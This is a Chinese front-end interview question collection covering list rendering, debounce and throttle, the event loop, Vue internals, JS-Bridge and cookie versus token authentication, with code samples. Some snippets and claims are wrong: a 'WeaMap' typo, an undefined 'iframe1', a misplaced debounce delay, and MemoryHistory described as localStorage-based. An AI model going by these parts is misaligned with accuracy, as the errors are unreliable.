# 优质面试真题(前端篇)
## 1、后端一次给你10万条数据，如何渲染？
前端
```js
// 请求函数
const getList = () => {
    return new Promise((resolve, reject) => {
        //步骤一:创建异步对象
        var ajax = new XMLHttpRequest();
        //步骤二:设置请求的url参数,参数一是请求的类型,参数二是请求的url,可以带参数
        ajax.open('get', 'http://127.0.0.1:8000');
        //步骤三:发送请求
        ajax.send();
        //步骤四:注册事件 onreadystatechange 状态改变就会调用
        ajax.onreadystatechange = function () {
            if (ajax.readyState == 4 && ajax.status == 200) {
                //步骤五 如果能够进到这个判断 说明 数据 完美的回来了,并且请求的页面是存在的
                resolve(JSON.parse(ajax.responseText))
            }
        }
    })
}

// 获取container对象
const container = document.getElementById('container')
```
后端
```js
// server.js

const http = require('http')
const port = 8000;

http.createServer(function (req, res) {
  // 开启Cors
  res.writeHead(200, {
    //设置允许跨域的域名，也可设置*允许所有域名
    'Access-Control-Allow-Origin': '*',
    //跨域允许的请求方法，也可设置*允许所有方法
    "Access-Control-Allow-Methods": "DELETE,PUT,POST,GET,OPTIONS",
    //允许的header类型
    'Access-Control-Allow-Headers': 'Content-Type'
  })
  let list = []
  let num = 0

  // 生成10万条数据的list
  for (let i = 0; i < 100000; i++) {
    num++
    list.push({
      src: 'https://p3-passport.byteacctimg.com/img/user-avatar/d71c38d1682c543b33f8d716b3b734ca~300x300.image',
      text: `我是${num}号嘉宾林三心`,
      tid: num
    })
  }
  res.end(JSON.stringify(list));
}).listen(port, function () {
  console.log('server is listening on port ' + port);
})

```
### 懒加载
分页渲染：在列表尾部放一个空节点blank，然后先渲染第1页数据，向上滚动，等到blank出现在视图中，就说明到底了，这时候再加载第二页，往后以此类推。至于怎么判断blank出现在视图上，可以使用getBoundingClientRect方法获取top属性.
```vue
<script setup lang="ts">
import { onMounted, ref, computed } from 'vue'
const getList = () => {
  // 跟上面一样的代码
}

const container = ref<HTMLElement>() // container节点
const blank = ref<HTMLElement>() // blank节点
const list = ref<any>([]) // 列表
const page = ref(1) // 当前页数
const limit = 200 // 一页展示
// 最大页数
const maxPage = computed(() => Math.ceil(list.value.length / limit))
// 真实展示的列表
const showList = computed(() => list.value.slice(0, page.value * limit))
const handleScroll = () => {
  // 当前页数与最大页数的比较
  if (page.value > maxPage.value) return
  const clientHeight = container.value?.clientHeight
  const blankTop = blank.value?.getBoundingClientRect().top
  if (clientHeight === blankTop) {
    // blank出现在视图，则当前页数加1
    page.value++
  }
}

onMounted(async () => {
  const res = await getList()
  list.value = res
})
</script>

<template>
  <div id="container" @scroll="handleScroll" ref="container">
    <div class="sunshine" v-for="(item) in showList" :key="item.tid">
      <img :src="item.src" />
      <span>{{ item.text }}</span>
    </div>
    <div ref="blank"></div>
  </div>
</template>
```
### 文档碎片 + requestAnimationFrame
文档碎片的好处：
* 1、之前都是每次创建一个div标签就appendChild一次，但是有了文档碎片可以先把1页的div标签先放进文档碎片中，然后一次性appendChild到container中，这样减少了appendChild的次数，极大提高了性能
* 2、页面只会渲染文档碎片包裹着的元素，而不会渲染文档碎片
```js
const renderList = async () => {
    console.time('列表时间')
    const list = await getList()
    console.log(list)
    const total = list.length
    const page = 0
    const limit = 200
    const totalPage = Math.ceil(total / limit)

    const render = (page) => {
        if (page >= totalPage) return
        requestAnimationFrame(() => {
            // 创建一个文档碎片
            const fragment = document.createDocumentFragment()
            for (let i = page * limit; i < page * limit + limit; i++) {
                const item = list[i]
                const div = document.createElement('div')
                div.className = 'sunshine'
                div.innerHTML = `<img src="${item.src}" /><span>${item.text}</span>`
                // 先塞进文档碎片
                fragment.appendChild(div)
            }
            // 一次性appendChild
            container.appendChild(fragment)
            render(page + 1)
        })
    }
    render(page)
    console.timeEnd('列表时间')
}
```
### 虚拟列表
原理：只渲染可见区域的DOM，滚动到对应位置时再渲染其它DOM。

第三方库：vue-virtual-scroll-list、react-virtualiszed。

[参考](https://juejin.cn/post/7031923575044964389)
## 2、Ajax-Fetch-Axios三者有什么区别
三者都用于网络请求，但是不同维度
* Ajax，一种技术统称。
* Fetch，浏览器原生API，用于网络请求，支持promise，类似于XMLHttpRequest。
* Axios，第三方库。
```js
// 用XMLHttpRequest实现ajax
function ajax1(url, successFn) {
    const xhr = new XMLHttpRequest()
    xhr.open("GET", url, false)
    xhr.onreadystatechange = function () {
        // 这里的函数异步执行，可参考之前 JS 基础中的异步模块
        if (xhr.readyState == 4) {
            if (xhr.status == 200) {
                successFn(xhr.responseText)
            }
        }
    }
    xhr.send(null)
}
// 用fetch实现ajax
function ajax2(url) {
    return fetch(url).then(res => res.json())
}
```
## 3、防抖和节流有什么区别，分别用于什么场景
防抖。一个搜索输入框，等输入停止之后，再触发搜索。
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>debounce</title>
</head>

<body>
    <p>debounce</p>
    搜索 <input id="input1">

    <script>
        function debounce(fn, delay = 200) {
            let timer = 0

            return function () {
                if (timer) clearTimeout(timer)

                timer = setTimeout(() => {
                    fn.apply(this, arguments) // 透传 this 和参数
                    timer = 0
                }, delay)
            }
        }

        const input1 = document.getElementById('input1')
        input1.addEventListener('keyup', debounce(() => {
            console.log('发起搜索', input1.value)
        }), 300)
    </script>
</body>

</html>
```
节流，有固定时间间隔。
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>throttle</title>
</head>

<body>
    <p>throttle</p>
    <div id="div1" draggable="true" style="width: 100px; height: 50px; background-color: #ccc; padding: 10px;">
        可拖拽
    </div>

    <script>
        function throttle(fn, delay = 100) {
            let timer = 0

            return function () {
                if (timer) return

                timer = setTimeout(() => {
                    fn.apply(this, arguments)
                    timer = 0
                }, delay)
            }
        }

        const div1 = document.getElementById('div1')
        div1.addEventListener('drag', throttle((e) => {
            console.log('鼠标的位置', e.offsetX, e.offsetY)
        }))
    </script>
</body>

</html>
```
节流：限制执行频率，有节奏地执行

防抖：限制执行次数，多次密集地触发只执行一次
## 4、px-%-em-rem-vw-vh有什么区别
* px：基本单位，绝对单位（其它的都是相对单位）
* %：相对于父元素的宽度比例
* em：相对于当前元素的font-size，字体大小的em是相对于父元素的font-size
* rem：相对于根节点的font-size
* vw：屏幕宽度的1%
* vh：屏幕高度的1%
* vmin：vw和vh两者的最小值
* vmax：vw和vh两者的最大值
## 5、什么时候不能使用箭头函数
箭头函数缺点：
* 没有arguments
* 无法通过call、apply、bind改变this

不适用1：对象方法箭头函数里不能用this
```js
const obj = {
    name: 'zls',
    getName: () => {
        return this.name
    }
}
console.log(obj.getName());
```
不适用2：原型方法箭头函数里不能用this
```js
const obj = {
    name: 'zls',
}
obj.__proto__.getName = () => {
    return this.name
}
console.log(obj.getName());
```
不适用3：构造函数箭头函数里不能用this
```js
const Foo = (name, city) => {
    this.name = name
    this.city = city
}
const f = new Foo('zls', '深圳')
```
不适用4：动态上下文中的回调函数箭头函数里不能用this
```js
const btn1 = document.getElementById('test')
btn1.addEventListener('click', () => {
    this.innerHTML = '3333'
})
```
不适用5：Vue生命周期和methods里箭头函数里不能用this
## 6、请描述 TCP 三次握手和四次挥手
建立TCP连接
* 先建立连接（确保双方都有收发消息的能力）
* 再传输内容（如发送一个get请求）
* 网络连接是TCP协议，传输内容是HTTP协议
### 三次握手，建立连接
* Client发包，Server接收。Server：有Client要找我
* Server发包，Client接收。Client：Server已经收到消息了
* Client发包，Server接收。Server：Client要准备发送了

![image](/blog/images/question-8-1.png)
### 四次挥手，断开连接
* Client发包，Server接收。Server：Client已请求结束
* Server发包，Client接收。Client：Server已收到，我等待它关闭（数据还没传输完）
* Server发包，Client接收。Client：Server此时可以关闭连接了（数据传输完了）
* Client发包，Server接收。Server：可以关闭了（然后关闭连接）

![image](/blog/images/question-8-2.png)
## 7、JS中for...in和for...of有什么区别
* for...in遍历得到key，for...of遍历得到value
* for...in可以遍历对象，for...of不可以
* for...of可以遍历Map Set，for...in不可以
* for...of可以遍历generator，for...in不可以
* for...in用于可枚举数据，如对象、数组、字符串，得到key。`enumerable描述符为true`
* for...of用于可迭代数据，如数组、字符串、Map、Set，得到value。`实现了Symbol.iterator`
## 7、for await...of有什么作用
for await...of用于遍历多个promise，是Promise.all的替代品
```js
function createPromise(val) {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(val)
        }, 1000)
    })
}
```
并发请求
```js
(async function () {
    const p1 = createPromise(100)
    const p2 = createPromise(200)
    const p3 = createPromise(300)

    const list = [p1, p2, p3]
    // Promise.all(list).then(res => console.log(res))
    for await (let res of list) {
        console.log(res)
    }
})()
```
顺序调用
```js
(async function () {
    const arr = [10, 20, 30]
    for (let num of arr) {
        const res = await createPromise(num)
        console.log(res)
    }
})()
```
## 8、offsetHeight-scrollHeight-clientHeight有什么区别
* offsetHeight、offsetWidth：border + padding + content
* clientHeight、clientWidth: padding + content
* scrollHeight、scrollWidth: padding + 实际内容尺寸
## 9、HTMLCollection和NodeList有什么区别
Node和Element的区别：
* DOM是一棵树，所有节点都是Node
* Node是Element的基类
* Element是其它HTML元素的基类，如HTMLDivElement
![image](/blog/images/question-8-3.png)

HTMLCollection是Element的集合，NodeList是Node的集合。
elem.children返回Element的集合（只包含element节点），elem.childNodes返回Node的集合（包含element节点、comment节点、Text节点）。
## 10、Vue组件通讯有几种方式
* props/$emit，适用于父子组件。
* provide/inject，适用于上下级组件（跨多级完美方案）。
父组件用
```js
import { computed } from "vue";
...
// 传递静态数据
provide: {
    info: "a",
},
// 传递this里的响应式数据
provide() {
    return {
        info: computed(() => this.a),
    };
},
```
子组件用: 
```js
inject: ["info"]
```
* Vuex，适用于全局组件。
* 自定义事件(eventBus)，适用于全局组件，vue2可以用`new Vue`，vue3用`event-emitter`库。
* $parent/$refs，适用于父子组件。子组件调用父组件的方法和属性用$parent，父组件调用子组件的方法和属性用$refs。
* $attrs，适用于上下级组件。$attrs会把父组件传递过来的属性和方法，除了props和emits定义的，都放到$attrs里面。

v-bind="$attrs": 将调用组件时的组件标签上绑定的非props的特性(class和style除外)向下传递。在子组件中应当添加inheritAttrs: false(避免父作用域的不被认作props的特性绑定应用在子组件的根元素上)。

Level1.vue
```vue
<template>
    <p>Level1</p>
    <Level2
        :a="a"
        :b="b"
        :c="c"
        @getA="getA" 
        @getB="getB"
        @getC="getC"
    ></Level2>
</template>

<script>
import Level2 from './Level2'

export default {
    name: 'Level1',
    components: { Level2 },
    data() {
        return {
            a: 'aaa',
            b: 'bbb',
            c: 'ccc'
        }
    },
    methods: {
        getA() {
            return this.a
        },
        getB() {
            return this.b
        },
        getC() {
            return this.c
        }
    }
}
</script>
```
Level2.vue
```vue
<template>
    <p>Level2</p>
    <Level3
        :x="x"
        :y="y"
        :z="z"
        @getX="getX"
        @getY="getY"
        @getZ="getZ"
        v-bind="$attrs"
    ></Level3>
</template>

<script>
import Level3 from './Level3'

export default {
    name: 'Level2',
    components: { Level3 },
    props: ['a'],  // 只接收父组件传来的a属性
    emits: ['getA'], // 只接收父组件传来的getA方法
    data() {
        return {
            x: 'xxx',
            y: 'yyy',
            z: 'zzz'
        }
    },
    methods: {
        getX() {
            return this.x
        },
        getY() {
            return this.y
        },
        getZ() {
            return this.z
        }
    },
    created() {
        console.log('level2', Object.keys(this.$attrs)) // $attrs会把父组件传递过来的属性和方法，除了props和emits定义的，都放到$attrs里面
    },
}
</script>
```
## 11、JS严格模式有什么特点
开启严格模式：`use strict`
* 全局变量必须先声明
* 禁止使用with
* 创建eval作用域
* 禁止this指向window
* 函数参数不能重名
## 12、HTTP跨域时为何要发送options请求
为什么会有跨域？因为浏览器的同源策略。同源策略一般限制Ajax网络请求，不能跨域请求server。解决跨域的方法：（1）JSONP（2）CORS（3）proxy代理

跨域时为何要发送options请求？

浏览器将CORS请求分为两类：简单请求（simple request）和非简单请求（not-simple-request）,简单请求浏览器不会预检，而非简单请求会预检。这两种方式怎么区分？

同时满足下列三大条件，就属于简单请求，否则属于非简单请求

* 请求方式只能是：GET、POST、HEAD
* HTTP请求头限制这几种字段：Accept、Accept-Language、Content-Language、Content-Type、Last-Event-ID
* Content-type只能取：application/x-www-form-urlencoded、multipart/form-data、text/plain

对于简单请求，浏览器直接请求，会在请求头信息中，增加一个origin字段，来说明本次请求来自哪个源（协议+域名+端口）。服务器根据这个值，来决定是否同意该请求，服务器返回的响应会多几个头信息字段，如图所示：上面的头信息中，三个与CORS请求相关，都是以Access-Control-开头。

* Access-Control-Allow-Origin：该字段是必须的，* 表示接受任意域名的请求，还可以指定域名
* Access-Control-Allow-Credentials：该字段可选，是个布尔值，表示是否可以携带cookie，（注意：如果Access-Control-Allow-Origin字段设置*，此字段设为true无效）
* Access-Control-Allow-Headers：该字段可选，里面可以获取Cache-Control、Content-Type、Expires等，如果想要拿到其他字段，就可以在这个字段中指定。

非简单请求是对那种对服务器有特殊要求的请求，比如请求方式是PUT或者DELETE，或者Content-Type字段类型是application/json。都会在正式通信之前，增加一次HTTP请求，称之为预检。浏览器会先询问服务器，当前网页所在域名是否在服务器的许可名单之中，服务器允许之后，浏览器会发出正式的XMLHttpRequest请求，否则会报错。
## 13、JS内存垃圾回收、内存泄露
* 普通的变量执行完了就会被垃圾回收
* window.obj由于外部引用导致不能被回收
* 闭包，也不会被垃圾回收，常驻内存
```js
function fn1() {
    const a = 'aa'
    console.log(a)

    const obj = { x: 100 } // 普通的变量执行完了就会被垃圾回收
    console.log(obj)
}
fn1()

function fn2() {
    const obj = { x: 100 }
    window.obj = obj // window.obj由于外部引用导致不能被回收
}
fn2()

function getDataFns() {
    const data = {} // 闭包，也不会被垃圾回收，常驻内存
    return {
        get(key) {
            return data[key]
        },
        set(key, value) {
            data[key] = value
        }
    }
}
const { get, set } = getDataFns()
set('x', 100)
get('x')
```
### 垃圾回收GC算法
1、引用计数（之前）。判断对象被引用的次数，当次数清0的时候，就会被回收
```js
// 对象被 a 引用
let a = { x: 100 }
let a1 = a
a = 10
a1 = null
```
但是引用计数存在问题，就是循环引用，这种情况下没法被回收
```js
// 循环引用
function fn3() {
    const obj1 = {}
    const obj2 = {}
    obj1.a = obj2
    obj2.a = obj1
}
fn3()
```
2、标记清除。定期从window去遍历各个属性，遍历完之后看看能不能得到某个对象，如果得到，那就保留，如果得不到，那就删除。
### JS闭包会导致内存泄露吗？
JS闭包不会导致内存泄露，因为闭包的数据不可以被垃圾回收。内存泄露是指非预期的情况，一般程序写错了才会造成内存泄漏。
```js
// IE6-7 内存泄漏的 bug
var div1 = document.getElementById('div1')
div1.a = div1
div1.someBigData = {}
```
### 如何检测JS内存泄露？
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>memory change</title>
</head>

<body>
    <p>
        memory change
        <button id="btn1">start</button>
    </p>

    <script>
        const arr = []
        for (let i = 0; i < 10 * 10000; i++) {
            arr.push(i)
        }

        function bind() {
            // 模拟一个比较大的数据
            const obj = {
                str: JSON.stringify(arr) // 简单的拷贝
            }
            window.addEventListener('resize', () => {
                console.log(obj)
            })
        }

        let n = 0
        function start() {
            setTimeout(() => {
                bind()
                n++

                // 执行 50 次
                if (n < 50) {
                    start()
                } else {
                    alert('done')
                }
            }, 200)
        }

        document.getElementById('btn1').addEventListener('click', () => {
            start()
        })
    </script>
</body>

</html>
```
通过Performance勾选Memory，然后点击Record，然后点击页面的按钮click，当弹出done的时候，点击stop，看JS Heap占用的内存变化。如果逐渐上升，则是内存泄露。如果是先上升，再下降，再上升，再下降，循环的话，就不是内存泄露。
### JS内存泄露的场景有哪些？
* 被全局变量、函数引用，组件销毁时未清除
* 被全局事件、定时器引用，组件销毁时未清除
* 被自定义事件引用，组件销毁时未清除

WeakMap和WeakSet，弱引用
```js
const wMap = new WeaMap() // 弱引用
function fn1() {
    const obj = { x: 100 }
    wMap.set(obj, 100) // weakMap 的 key 只能是引用类型
}
fn1()  // fn1执行完后，obj会被清除
```
## 14、浏览器和nodejs事件循环（Event Loop）有什么区别
JS是单线程的，浏览器中JS执行和DOM渲染共用一个线程。

* 宏任务：定时器、网络请求、script主代码块
* 微任务：promise.then、async/await、MutationObserve

微任务在下一轮DOM渲染之前执行，宏任务在之后执行。

### nodejs事件循环
* nodejs 同样使用ES语法，也是单线程，也需要异步
* 异步任务也分为宏任务和微任务
* 但是它的宏任务和微任务，分不同类型，有不同优先级
```js
console.info('index')

console.info('start')
setImmediate(() => {
    console.info('setImmediate')
})
setTimeout(() => {
    console.info('timeout')
})
Promise.resolve().then(() => {
    console.info('promise then')
})
process.nextTick(() => {
    console.info('nextTick')
})
console.info('end')

// index
// start
// end
// nextTick
// promise then
// timeout
// setImmediate
```
nodejs宏任务类型和优先级：
* Timers - setTimeout、setInterval
* pending callbacks - 处理网络、流、TCP的错误回调
* Idle，prepare - 闲置状态（nodejs内部使用）
* Poll 轮询 - 执行poll中的I/O队列
* Check 检查 - 存储setImmediate回调
* Close callbacks - 关闭回调，如socket.on('close')

nodejs微任务类型和优先级：
* Process.nextTick
* Promise.then、async/await

nodejs事件循环：
* 执行同步代码
* 执行微任务（Process.nextTick优先级最高）
* 按顺序执行6个类型的宏任务（每个结束时都执行当前的微任务）
## 15、虚拟DOM（vdom）真的很快吗
* Virtual Dom，虚拟DOM
* 用JS对象模拟DOM节点数据
* Vdom是数据驱动视图的实现方案
## 16、遍历一个数组用for和forEach哪个更快
```js
const arr = []
for (let i = 0; i < 100 * 10000; i++) {
    arr.push(i)
}
const length = arr.length

console.time('for')
let n1 = 0
for (let i = 0; i < length; i++) {
    n1++
}
console.timeEnd('for') // 3.7ms

console.time('forEach')
let n2 = 0
arr.forEach(() => n2++)
console.timeEnd('forEach') // 15.1ms
```
* for更快
* forEach每次都要创建一个函数来调用，而for不会创建函数
* 函数需要独立的作用域，会有额外的开销
## 17、Vue-router的MemoryHistory是什么
Vue-router三种模式：
* hash模式（通过location.hash实现，url带#）
* WebHistory模式(history模式，通过h5的history API实现，url带/)
* MemoryHistory模式（V4之前叫abstract history，通过localStorage实现，url不会变化，没有#或者/）

MemoryHistory模式
* 优点:这种模式适合非浏览器,比如说app里面做路由，app里面没有路径，不是网页，就用memory模式
* 缺点：没有url,只对单机有效,页面没有链接 复制给别人只能进入初始状态
## 18、nodejs如何开启多进程，进程如何通讯
### 进程和线程
* 进程（process）：OS进行资源(分配和调度)的最小单位，有独立内存空间。
* 线程（thread）：OS进行运算调度的最小单位，共享进程内存空间。

一个进程里面可以包含多个线程。JS是单线程的，但可以开启多进程执行，如WebWorker。
### 为何需要多进程
* 多核CPU，更适合处理多进程
* 内存较大，多个进程才能更好地利用（单进程有内存上限）
### 使用child_process.fork开启多进程
child_process.fork适用于计算量大的时候开启子进程。

process-fork.js，主进程
```js
const http = require('http')
const fork = require('child_process').fork

const server = http.createServer((req, res) => {
    if (req.url === '/get-sum') {
        console.info('主进程 id', process.pid)

        // 开启子进程
        const computeProcess = fork('./compute.js')
        computeProcess.send('开始计算') // 发送消息

        // 主进程接收消息
        computeProcess.on('message', data => {
            console.info('主进程接受到的信息：', data)
            res.end('sum is ' + data)
        })

        computeProcess.on('close', () => {
            console.info('子进程因报错而退出')
            computeProcess.kill()
            res.end('error')
        })
    }
})
server.listen(3000, () => {
    console.info('localhost: 3000')
})
```
compute.js，子进程，进行计算
```js
/**
 * @description 子进程，计算
 */

function getSum() {
    let sum = 0
    for (let i = 0; i < 10000; i++) {
        sum += i
    }
    return sum
}

// 子进程接收消息
process.on('message', data => {
    console.log('子进程 id', process.pid)
    console.log('子进程接受到的信息: ', data)

    const sum = getSum()

    // 发送消息给主进程
    process.send(sum)
})
```
### 使用cluster开启多进程
cluster适用于集群
```js
const http = require('http')
const cpuCoreLength = require('os').cpus().length // 获取核的数量
const cluster = require('cluster') // 集群

// 如果是集群的主进程，则根据核数来开启子进程
if (cluster.isMaster) {
    for (let i = 0; i < cpuCoreLength; i++) {
        cluster.fork() // 开启子进程
    }
    // 当其中一个子进程崩溃的时候，再开启一个子进程
    cluster.on('exit', worker => {
        console.log('子进程退出')
        cluster.fork() // 进程守护（再开启一个子进程，一个死了再来一个）
    })
} else {
    // 否则是集群的子进程
    // 多个子进程会共享一个 TCP 连接，提供一份网络服务
    const server = http.createServer((req, res) => {
        res.writeHead(200)
        res.end('done')
    })
    server.listen(3000)
}
```
### 使用PM2开启多进程
工作中一般使用PM2开启多进程。
## 19、请讲述JS-Bridge的实现原理
JSBridge是一座用JavaScript搭建起来的桥，一端是web，一端是native。我们搭建这座桥的目的也很简单，让native可以调用web的js代码，让web可以 “调用” 原生的代码。JS无法直接调用native API，需要通过一些特定的“格式”来调用，这些“格式”就统称为JS-Bridge，例如微信JSSDK。

JS Bridge的常见实现方式：注册全局API和URL Scheme。
### 注册全局API
```js
const version = window.getVersion() // 从window中获取
```
无法处理异步的情况。
### URL Scheme
通过iframe去调用app的URL Scheme。可以处理异步的情况。
```js
var url = 'jsbridge://doAction?title=分享标题&desc=分享描述&link=http%3A%2F%2Fwww.baidu.com';
var iframe = document.createElement('iframe');
iframe.style.width = '1px';
iframe.style.height = '1px';
iframe.style.display = 'none';
iframe.src = url;
document.body.appendChild(iframe);
setTimeout(function() {
    iframe.remove();
}, 100);
```
封装 JS-bridge
```js
// 封装 JS-bridge
const sdk = {
    invoke(url, data = {}, onSuccess, onError) {
        const iframe = document.createElement('iframe')
        iframe.style.visibility = 'hidden'
        document.body.appendChild(iframe)
        iframe.onload = () => {
            const content = iframe1.contentWindow.document.body.innerHTML
            onSuccess(JSON.parse(content))
            iframe.remove()
        }
        iframe.onerror = () => {
            onError()
            iframe.remove()
        }
        iframe.src = `my-app-name://${url}?data=${JSON.stringify(data)}`
    },
    fn1(data, onSuccess, onError) {
        this.invoke('api/fn1', data, onSuccess, onError)
    },
    fn2(data, onSuccess, onError) {
        this.invoke('api/fn2', data, onSuccess, onError)
    },
    fn3(data, onSuccess, onError) {
        this.invoke('api/fn3', data, onSuccess, onError)
    },
}
```
## 20、requestIdleCallback和requestAnimationFrame有什么区别
由React fiber引起的关注：
* 组件树转换为链表，可分段渲染
* 渲染时可以暂停，去执行其他高优先级任务，空闲时再继续渲染
* 如何判断空闲？用`requestIdleCallback`

区别：
* `requestAnimationFrame` 每次渲染完（渲染完一帧后）都会执行，高优先级。

每秒60帧，一帧16.6ms。可以利用这个来做动画

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>requestAnimationFrame</title>
    <style>
        #box {
            width: 100px;
            height: 50px;
            border: 3px solid #333;
        }
    </style>
</head>

<body>
    <p>requestAnimationFrame</p>
    <button id="btn1">change</button>
    <div id="box"></div>
    <script>
        const box = document.getElementById('box')
        document.getElementById('btn1').addEventListener('click', () => {
            let curWidth = 100
            const maxWidth = 400
            function addWidth() {
                curWidth = curWidth + 3
                box.style.width = `${curWidth}px`
                if (curWidth < maxWidth) {
                    window.requestAnimationFrame(addWidth) // 下一帧再去执行，时间不用自己控制
                }
            }
            addWidth()
        })
    </script>
</body>

</html>
```
* `requestIdleCallback` 空闲时才会执行，低优先级

```js
window.onload = () => {
    console.info('start')
    setTimeout(() => {
        console.info('timeout')
    })
    window.requestIdleCallback(() => {
        console.info('requestIdleCallback')
    })
    window.requestAnimationFrame(() => {
        console.info('requestAnimationFrame')
    })
    console.info('end')
    // 渲染顺序：start、end、timeout、requestAnimationFrame、requestIdleCallback
}
```
requestIdleCallback和requestAnimationFrame都是宏任务，因为都是要等DOM渲染完后才执行。
## 21、Vue每个生命周期都做了什么
beforeCreate
* 创建一个空白的Vue实例
* data method尚未被初始化，不可调用

created
* Vue实例初始化完成，完成响应式绑定
* data method都已经初始化完成，可调用
* 尚未开始渲染模板

beforeMount
* 编译模板，调用render生成vdom
* 还没有开始渲染DOM

mounted
* 完成DOM渲染
* 组件创建完成
* 开始由"创建阶段"进入"运行阶段"

beforeUpdate
* data发生变化之后
* 准备更新DOM（尚未更新DOM）

updated
* data发生变化，且DOM更新完成
* (不要在updated中修改data，可能会导致死循环)

beforeUnmount
* 组件进入销毁阶段（尚未销毁，可正常使用）
* 可移除、解绑一些全局事件、自定义事件

unmounted
* 组件被销毁了
* 所有子组件也被销毁了
### Vue什么时候操作DOM比较合适
* mounted和updated都不能保证子组件全部挂载完成
* 在$nextTick里面操作渲染DOM
### Vue3 Composition API生命周期有啥区别
* 用setup代替了beforeCreate和created
* 使用Hooks函数的形式，如mounted改为onMounted()
## 22、Vue2、Vue3和React三者的diff算法有什么区别
如果要严格diff两棵树，时间复杂度是O(n^3)，不可用。

Tree diff的优化：
* 只比较同一层级，不跨级比较
* tag不同则删掉重建（不再比较内部细节）
* 子节点通过key区分（key的重要性）

优化后的时间复杂度是O(n)
### React diff
仅右移。
![image](/blog/images/question-8-4.png)
第一步、第二步不动，因为React仅右移，第三步，old a 右移两步就可以和new a对上了。
### Vue2 diff
双端比较。四个指针两两比较，比较完后，左边的两个指针往后移，右边的两个指针往左移，每移动一步，也是四个指针两两比较。直到中间相遇才算比较完成。
![image](/blog/images/question-8-5.png)
### Vue3 diff
最长递增子序列。
![image](/blog/images/question-8-6.png)

### key的作用
key的作用主要是为了高效的更新虚拟DOM。
* 匹配了Key，则只移动元素-性能较好
* 未匹配Key，则删除重建-性能较差
## 23、移动端H5点击有300ms延迟，该如何解决
背景：早期移动端为了放大网页，需要双击。300ms延迟是为了区分h5端是单击还是双击，如果点击后300ms内没有再点击，则是单击，否则就是双击。

300ms有延迟，如何解决？
### FastClick
原理: 在检测到touchend事件的时候，会通过DOM自定义事件模拟一个click事件，并把浏览器在300ms之后真正的click事件阻止掉。tuochstart、tuoched会先于click触发。
```js
// 引入
import FastClick from 'fastclick'
// 使用
FastClick.attach(document.body);
```
### 现代浏览器的改进
设置meta头`width=device-width`可以取消掉300ms延迟。
```html
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
```
## 24、Retina 屏幕的 1px 像素，如何实现
Retina: 一种新型高分辨率的显示标准,又称视网膜显示屏。

在移动端开发中，UI设计稿中设置边框为1px，前端在开发中如果出现border:1px,测试会发现在Retina屏机型中，1px会比较粗，即是经典的移动端1px像素问题。
比如iphone6的屏幕宽度为375px，设计师的视觉稿一般是750px，如果UI的border 1px,而前端实际开发的时候是不能采用1px border的，应该是1px/2。

解决方案

![image](/blog/images/question-8-7.png)
### 普通的 1px
如果仅仅使用 css 的 1px 来设置 border ，那可能会出现比较粗的情况。因为，有些手机屏幕的 DPR = 2 ，即 1px 它会用两个物理像素来显示，就粗了。
```css
#box {
    padding: 10px 0;
    border-bottom: 1px solid #eee;
}
```
### 0.5px
```css
.border-1px {
  border: 1px solid #333；
}
@media screen and(-webkit-min-device-pixel-ratio：2) {
  .border-1px {border: 0.5px solid #333；}
}
@media screen and(-webkit-min-device-pixel-ratio: 3) {
  .border-1px {border: 0.333333px solid #333；}
}
```
### 伪元素+transform
使用 css 伪类 + transform 来优化这一问题。即把默认的 1px 宽度给压缩 0.5 倍
```css
#box {
    padding: 10px 0;
    position: relative;
}
#box::before {
    content: '';
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    height: 1px;
    background: #d9d9d9;
    transform: scaleY(0.5);
    transform-origin: 0 0;
}
```
### box-shadow
如果有 border-radius 就不能使用 transform 进行缩放了，因为如果是整体缩放，肯定会影响其中的content内容，这时就可以巧用 box-shadow 设置来解决。

box-shadow属性的值依次是：
* X 偏移量 0
* Y 偏移量 0
* 阴影模糊半径 0
* 阴影扩散半径 0.5px
* 阴影颜色 #333
```css
#box {
    width: 200px;
    height: 100px;
    margin-top: 20px;
    padding: 10px;
    border-radius: 10px;
    box-shadow: 0 0 0 0.5px #333;
}
```
## 25、HTTP请求中token和cookie有什么区别
### cookie
cookie的特点：
* HTTP无状态，每次请求都要携带cookie，以帮助识别身份
* 服务端可以向客户端set-cookie，cookie大小限制为4kb
* 默认有跨域限制：不可跨域共享、传递cookie。

在使用Ajax技术发送跨域请求时，默认情况下不会在请求中携带cookie信息。

前端：`withCredentials` 指定在涉及到跨域请求时，是否携带cookie信息，默认值为false.

服务端:
`Access-Control-Allow-Credentials：true` 允许客户端发送请求时携带cookie.

现代浏览器开始禁止第三方cookie，和跨域限制不同，这里是禁止网页引入的第三方JS设置cookie。打击第三方广告，保护用户隐私。
### session
* cookie用户登录验证，存储用户标识（如userid），session存储在服务端，存储用户详细信息，和cookie信息一一对应
* cookie+session是常见登录验证解决方案
### token
* cookie是http规范，而token是自定义传递，用于JWT
* cookie会默认被浏览器存储，而token需要自己存储，使用localStorage
* token没有跨域限制
### JWT（JSON Web Token）
* 前端发起登录，后端验证成功之后，返回一个加密的token
* 前端自行存储这个token
* 以后访问服务端接口，都带着这个token，作为用户信息
* 新的登录验证解决方案
### session和JWT哪个更好
session优点：
* 原理简单，易于学习
* 用户信息存储在服务端，可快速封禁某个用户

session缺点：
* 占用服务端内存，硬件成本高
* 多进程，多服务器时，不太好同步----需使用第三方缓存，redis
* 默认有跨域限制

JWT优点：
* 不占用服务端内存
* 多进程，多服务器不受影响，因为服务端不存储在客户端
* 没有跨域限制

JWT缺点：
* 用户信息存储在客户端，无法快速封禁某个用户
* 万一服务端秘钥被泄露，则用户信息全部丢失
* token体积一般大于cookie，会增加请求的数据量

如有严格管理用户信息的需求（保密，快速封禁），推荐session。如没有特殊要求，则使用JWT（如创业初期的网站）
